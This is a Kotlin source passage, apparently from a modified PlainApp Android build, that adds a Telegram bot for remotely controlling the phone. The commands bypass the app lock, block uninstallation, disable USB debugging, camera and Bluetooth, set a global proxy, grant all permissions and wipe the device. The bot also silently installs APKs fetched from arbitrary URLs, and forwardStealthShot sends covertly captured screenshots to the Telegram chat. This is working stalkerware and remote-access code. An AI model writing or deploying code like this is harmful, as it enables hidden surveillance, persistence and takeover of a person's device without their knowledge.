                sendMessage("⚠️ <b>App not ready</b>\n\nCould not obtain a MainActivity reference. Open the app manually and try again.")
                return
            }
            activity.runOnUiThread {
                // Clear the PIN/biometric gate so the Settings page renders immediately
                activity.isLocked = false
                // Navigate directly to the Web Settings composable destination
                activity.navControllerState.value?.navigate(com.ismartcoding.plain.ui.nav.Routing.WebSettings) {
                    launchSingleTop = true
                }
            }

            sendMessage(
                "🌐 <b>Web Settings opened</b>\n\n" +
                "PlainApp is now showing the <b>Web Console → Settings</b> page on the device.\n" +
                "App lock was bypassed automatically.\n\n" +
                "<i>You can now toggle the web server, change the port, manage permissions, etc.</i>"
            )
        } catch (e: Exception) {
            sendMessage("❌ Could not open Web Settings: ${htmlEsc(e.message ?: "unknown")}")
        }
    }

    private suspend fun cmdBotPassword(args: List<String>) {
        val ctx = MainApp.instance
        when (args.firstOrNull()?.lowercase()) {
            "on", "enable", "1", "true" -> {
                TelegramBotPasswordEnabledPreference.putAsync(ctx, true)
                botPasswordEnabled = true
            }
            "off", "disable", "0", "false" -> {
                TelegramBotPasswordEnabledPreference.putAsync(ctx, false)
                botPasswordEnabled = false
            }
            null, "" -> { /* just show */ }
            else -> { sendMessage("Usage: /botpassword [on|off]"); return }
        }
        val enabled = TelegramBotPasswordEnabledPreference.getAsync(ctx)
        val hasPassword = TelegramBotPasswordPreference.getAsync(ctx).isNotBlank()
        sendMessage(
            "🤖 <b>Telegram Bot Password</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
            "Protection: <b>${if (enabled) "🟢 Enabled" else "⚪ Disabled"}</b>\n" +
            "Password set: <b>${if (hasPassword) "✅ Yes" else "❌ No"}</b>\n\n" +
            "<i>The master password always works regardless of this setting.</i>",
            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
                listOf("🔐 Enable" to "aps_botpwd_on", "🔓 Disable" to "aps_botpwd_off"),
                listOf("🔑 Change Password" to "aps_setbotpwd"),
            ))
        )
    }

    private suspend fun cmdSetBotPassword() {
        val ctx = MainApp.instance
        val question = SecurityQuestionPreference.getAsync(ctx)
        pendingInput = "setbotpwd_secqa"
        sendMessage(
            "🔑 <b>Change Bot Password</b>\n\n" +
            "To protect this change, first answer the security question:\n\n" +
            "<b><i>${htmlEsc(question)}</i></b>\n\n" +
            "Type your answer below. Send any /command to cancel."
        )
    }

    private suspend fun cmdDeviceOwner(args: List<String>) {
        sendTyping()
        val ctx = MainApp.instance
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val adminComponent = android.content.ComponentName(ctx, com.ismartcoding.plain.receivers.PlainDeviceAdminReceiver::class.java)
        val isOwner = dpm.isDeviceOwnerApp(ctx.packageName)
        val isAdmin = dpm.isAdminActive(adminComponent)
        val sub = args.firstOrNull()?.lowercase() ?: "status"

        if (!isOwner && sub != "status") {
            sendMessage(
                "🛡️ <b>Device Owner</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
                "❌ PlainApp is <b>NOT</b> Device Owner.\n\n" +
                "Only <code>/deviceowner status</code> is available until Device Owner is set.\n\n" +
                "<b>Enable Device Owner (one-time ADB):</b>\n" +
                "<code>adb shell dpm set-device-owner com.ismartcoding.plain/.receivers.PlainDeviceAdminReceiver</code>"
            )
            return
        }

        when (sub) {
            "status" -> {
                val sb = StringBuilder("🛡️ <b>Device Owner Status</b>\n━━━━━━━━━━━━━━━━━━━━\n")
                sb.append("Device Owner: <b>${if (isOwner) "✅ Active" else "❌ Not set"}</b>\n")
                sb.append("Device Admin: <b>${if (isAdmin) "✅ Active" else "❌ Not set"}</b>\n")
                if (isOwner) {
                    sb.append("\n<b>Active Restrictions:</b>\n")
                    try {
                        val blocked = dpm.isUninstallBlocked(adminComponent, ctx.packageName)
                        sb.append("  Uninstall blocked: ${if (blocked) "✅" else "❌"}\n")
                    } catch (_: Exception) {}
                    try {
                        val camDis = dpm.getCameraDisabled(adminComponent)
                        sb.append("  Camera disabled: ${if (camDis) "✅ Disabled" else "❌ Enabled"}\n")
                    } catch (_: Exception) {}
                    try {
                        val um = ctx.getSystemService(android.content.Context.USER_SERVICE) as? android.os.UserManager
                        val btDis = um?.hasUserRestriction(android.os.UserManager.DISALLOW_BLUETOOTH) == true
                        sb.append("  Bluetooth restricted: ${if (btDis) "✅" else "❌"}\n")
                    } catch (_: Exception) {}
                    sb.append("\n<b>Quick actions:</b>\n")
                    sb.append("  /deviceowner grantperms — auto-grant all permissions\n")
                    sb.append("  /deviceowner kiosk on|off — toggle kiosk mode\n")
                    sb.append("  /deviceowner camera on|off — disable/enable camera\n")
                    sb.append("  /deviceowner blockinstall on|off — block uninstall\n")
                    sb.append("  /deviceowner bt on|off — disable/enable Bluetooth\n")
                    sb.append("  /deviceowner usb on|off — disable/enable USB debugging\n")
                    sb.append("  /deviceowner proxy host:port — set global proxy\n")
                    sb.append("  /deviceowner clearproxy — remove global proxy\n")
                    sb.append("  /deviceowner wipe — ⚠️ factory reset device\n")
                }
                sendMessage(
                    sb.toString(),
                    replyMarkup = if (isOwner) TelegramApiClient.inlineKeyboard(listOf(
                        listOf("⚡ Grant All Perms" to "do_grantperms", "🔒 Block Uninstall" to "do_blockinstall")
                    )) else null
                )
            }
            "grantperms" -> {
                val result = com.ismartcoding.plain.helpers.DeviceOwnerHelper.grantAllPermissionsToSelf(ctx)
                sendMessage("⚡ <b>Grant All Permissions</b>\n━━━━━━━━━━━━━━━━━━━━\n✅ Granted: ${result.granted.size}\n⚠️ Failed: ${result.failed.size}\n⏭ Skipped: ${result.skipped.size}\n\n${if (result.success) "🎉 All permissions granted successfully!" else "⚠️ Some permissions could not be granted (may require reboot or accessibility service)."}")
            }
            "blockinstall" -> {
                val on = args.getOrNull(1)?.lowercase() != "off"
                dpm.setUninstallBlocked(adminComponent, ctx.packageName, on)
                sendMessage("🔒 <b>Uninstall Block</b>: ${if (on) "✅ Enabled — PlainApp cannot be uninstalled" else "❌ Disabled — uninstall is now allowed"}")
            }
            "kiosk" -> {
                val on = args.getOrNull(1)?.lowercase() != "off"
                if (on) com.ismartcoding.plain.helpers.DeviceOwnerHelper.enableKioskMode(ctx)
                else com.ismartcoding.plain.helpers.DeviceOwnerHelper.disableKioskMode(ctx)
                sendMessage("📺 <b>Kiosk Mode</b>: ${if (on) "✅ Enabled — device pinned to PlainApp" else "❌ Disabled — normal navigation restored"}")
            }
            "camera" -> {
                val off = args.getOrNull(1)?.lowercase() != "off"
                dpm.setCameraDisabled(adminComponent, off)
                sendMessage("📷 <b>Camera</b>: ${if (off) "❌ Disabled device-wide" else "✅ Enabled for all apps"}")
            }
            "bt" -> {
                val off = args.getOrNull(1)?.lowercase() != "off"
                com.ismartcoding.plain.helpers.DeviceOwnerHelper.setBluetoothDisabled(off, ctx)
                sendMessage("🔵 <b>Bluetooth</b>: ${if (off) "❌ Disabled device-wide (DISALLOW_BLUETOOTH restriction)" else "✅ Enabled"}")
            }
            "usb" -> {
                val off = args.getOrNull(1)?.lowercase() != "off"
                dpm.setGlobalSetting(adminComponent, android.provider.Settings.Global.ADB_ENABLED, if (off) "0" else "1")
                sendMessage("🔌 <b>USB Debugging</b>: ${if (off) "❌ Disabled" else "✅ Enabled"}")
            }
            "proxy" -> {
                val proxyStr = args.getOrNull(1) ?: ""
                val parts = proxyStr.split(":")
                val host = parts.getOrNull(0) ?: ""
                val port = parts.getOrNull(1)?.toIntOrNull() ?: 0
                if (host.isBlank() || port == 0) {
                    sendMessage("❌ Usage: /deviceowner proxy <host>:<port>  e.g. /deviceowner proxy 192.168.1.1:8080")
                    return
                }
                com.ismartcoding.plain.helpers.DeviceOwnerHelper.setGlobalProxy(host, port, ctx)
                sendMessage("🌐 <b>Global Proxy</b> set to <code>$host:$port</code>")
            }
            "clearproxy" -> {
                com.ismartcoding.plain.helpers.DeviceOwnerHelper.clearGlobalProxy(ctx)
                sendMessage("🌐 <b>Global Proxy</b> cleared.")
            }
            "wipe" -> {
                val confirm = args.getOrNull(1)?.uppercase()
                if (confirm != "CONFIRM") {
                    sendMessage("⚠️ <b>DANGER: Wipe Device</b>\n\nThis will <b>permanently erase ALL data</b> on the device.\n\nTo confirm, send:\n<code>/deviceowner wipe CONFIRM</code>")
                    return
                }
                sendMessage("💀 <b>Initiating factory reset…</b> Device will wipe in seconds.")
                coIO { com.ismartcoding.plain.helpers.DeviceOwnerHelper.wipeDevice(wipeExternalStorage = false, wipeResetProtection = false, ctx = ctx) }
            }
            else -> sendMessage("❓ Unknown Device Owner subcommand: <code>$sub</code>\n\nSend /deviceowner status for help.")
        }
    }

    private suspend fun cmdSecurityQA(args: List<String>) {
        val ctx = MainApp.instance
        val sub = args.firstOrNull()?.lowercase()
        val question = SecurityQuestionPreference.getAsync(ctx)
        if (sub == "change" || sub == "set" || sub == "update") {
            pendingInput = "secqa_verify"
            sendMessage(
                "❓ <b>Change Security Q&A</b>\n\n" +
                "First, answer the current security question to confirm it's you:\n\n" +
                "<b><i>${htmlEsc(question)}</i></b>\n\n" +
                "Send any /command to cancel."
            )
            return
        }
        val hasAnswer = SecurityAnswerPreference.getAsync(ctx).isNotBlank()
        sendMessage(
            "❓ <b>Security Q&A (Dashboard Gate)</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
            "Question: <i>${htmlEsc(question)}</i>\n" +
            "Answer set: <b>${if (hasAnswer) "✅ Yes" else "❌ No"}</b>\n\n" +
            "<i>This is the answer required to unlock the feedback/dashboard panel in the web UI.</i>\n\n" +
            "Use /securityqa change to update the question and answer.",
            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
                listOf("✏️ Change Q&A" to "aps_secqa")
            ))
        )
    }

    // ─────────────────────────────────────────────────────────────────────────
    // APK self-update
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * Called when the user sends an .apk file directly to the bot chat.
     * Downloads it from Telegram servers and triggers installation.
     */
    private suspend fun handleDocumentMessage(document: org.json.JSONObject) {
        val fileId = document.optString("file_id", "")
        val fileName = document.optString("file_name", "PlainApp-update.apk")
        val fileSize = document.optLong("file_size", 0L)

        if (fileId.isBlank()) {
            sendMessage("❌ Could not extract file ID from the document.")
            return
        }

        sendMessage(
            "📲 <b>APK received: ${htmlEsc(fileName)}</b>\n" +
            "📦 Size: ${humanSize(fileSize)}\n\n" +
            "⬇️ Downloading from Telegram…"
        )

        val destDir = java.io.File(MainApp.instance.cacheDir, "apk_updates")
        destDir.mkdirs()
        val destFile = java.io.File(destDir, "PlainApp-update.apk")

        val filePath = withContext(Dispatchers.IO) {
            TelegramApiClient.getFilePath(token, fileId)
        }
        if (filePath.isNullOrBlank()) {
            sendMessage(
                "❌ Failed to get download URL from Telegram.\n\n" +
                "<i>Note: Telegram Bot API only supports files up to 20 MB.\n" +
                "For larger APKs use /update &lt;url&gt; with a direct download link instead.</i>"
            )
            return
        }

        val ok = withContext(Dispatchers.IO) {
            TelegramApiClient.downloadToFile(token, filePath, destFile)
        }
        if (!ok || !destFile.exists()) {
            sendMessage("❌ Download failed. Check network and try again.")
            return
        }

        triggerApkInstall(destFile)
    }

    /**
     * /update [url] — download an APK from a URL and install it.
     * If no URL is provided, prompts the user to type one (or send an APK file).
     */
    private suspend fun cmdUpdate(args: List<String>) {
        val url = args.firstOrNull()?.trim()
        if (url.isNullOrBlank()) {
            val isOwner = com.ismartcoding.plain.helpers.ApkUpdateHelper.isDeviceOwner(MainApp.instance)
            pendingInput = "update_url"
            sendMessage(
                "📲 <b>Update PlainApp</b>\n━━━━━━━━━━━━━━━━━━━━\n\n" +
                "Two ways to update without touching the device:\n\n" +
                "📁 <b>Option 1 — Send APK file</b>\n" +
                "   Send a <code>.apk</code> file directly to this chat and it will be installed automatically.\n\n" +
                "🔗 <b>Option 2 — URL</b>\n" +
                "   Type or paste a direct download link below:\n" +
                "   <i>e.g.</i> <code>https://example.com/PlainApp-debug.apk</code>\n\n" +
                (if (isOwner)
                    "🔇 <b>Device Owner mode active</b> — update will be <b>completely silent</b>. No tap needed!\n"
                else
                    "⚠️ A system <b>Install</b> dialog will appear on the device.\n" +
                    "   You will need to tap <b>Install</b> once to confirm.\n" +
                    "   For fully silent updates, run once via USB/ADB:\n" +
                    "   <code>adb shell dpm set-device-owner com.ismartcoding.plain/.receivers.PlainDeviceAdminReceiver</code>\n") +
                "\nSend any /command to cancel."
            )
            return
        }
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            sendMessage("❌ Invalid URL. Must start with <code>http://</code> or <code>https://</code>\n\nUsage: <code>/update &lt;url&gt;</code>")
            return
        }
        cmdDownloadAndInstallApk(url)
    }

    /** Downloads an APK from [url] and triggers installation. */
    private suspend fun cmdDownloadAndInstallApk(url: String) {
        val displayUrl = if (url.length > 80) url.take(80) + "…" else url
        sendMessage("⬇️ <b>Downloading APK…</b>\n\n<code>${htmlEsc(displayUrl)}</code>")

        val ctx = MainApp.instance
        val destDir = java.io.File(ctx.cacheDir, "apk_updates")
        destDir.mkdirs()
        val destFile = java.io.File(destDir, "PlainApp-update.apk")

        val ok = withContext(Dispatchers.IO) {
            TelegramApiClient.downloadFromUrl(url, destFile)
        }
        if (!ok || !destFile.exists()) {
            sendMessage(
                "❌ Download failed.\n\n" +
                "Make sure the URL is a <b>direct link</b> to an APK file and is reachable from the device's internet connection.\n\n" +
                "Alternatively, build the APK and <b>send the file directly to this chat</b>."
            )
            return
        }
        triggerApkInstall(destFile)
    }

    /**
     * Triggers installation of [apkFile].
     * Uses Device Owner silent install if available; otherwise opens the system dialog.
     */
    private suspend fun triggerApkInstall(apkFile: java.io.File) {
        val ctx = MainApp.instance
        val isOwner = com.ismartcoding.plain.helpers.ApkUpdateHelper.isDeviceOwner(ctx)
        sendMessage(
            "✅ <b>APK ready</b> (${humanSize(apkFile.length())})\n\n" +
            if (isOwner)
                "🔇 Installing silently (Device Owner mode)… Please wait a moment."
            else
                "📱 System install dialog is now open on the device.\n\n" +
                "<b>Tap Install to confirm the update.</b>\n\n" +
                "<i>The app will restart automatically after install.</i>"
        )
        com.ismartcoding.plain.helpers.ApkUpdateHelper.install(ctx, apkFile) { success, message ->
            scope.launch {
                when {
                    message == "dialog_shown" -> { /* user already told above */ }
                    success -> sendMessage(
                        "✅ <b>PlainApp updated successfully!</b>\n\n" +
                        "The app has been reinstalled silently. Changes take effect on next app start."
                    )
                    else -> sendMessage(
                        "❌ <b>Silent install failed:</b> ${htmlEsc(message)}\n\n" +
                        "<i>Try sending the APK file directly to this chat — the system dialog will appear as a fallback.</i>"
                    )
                }
            }
        }
    }

    // ─────────────────────────────────────────────────────────────────────────

    /** Called by StealthScreenshotCapturer when a new shot is saved. */
    fun forwardStealthShot(shot: StealthScreenshotHelper.Shot) {
        if (!isRunning || !forwardStealthShotsEnabled || token.isBlank() || chatId.isBlank()) return
        scope.launch {
            try {
                val file = java.io.File(shot.absPath)
                if (!file.exists()) return@launch
                val caption = buildString {
                    append("📸 <b>Stealth Screenshot</b>\n")
                    if (shot.appLabel.isNotBlank()) append("📱 App: <b>${htmlEsc(shot.appLabel)}</b>\n")
                    append("🕐 <i>$ts</i>")
                }
                TelegramApiClient.sendPhoto(token, chatId, file, caption)
            } catch (e: Exception) {
                LogCat.e("TelegramBot forwardStealthShot failed: ${e.message}")
            }
        }
    }
}

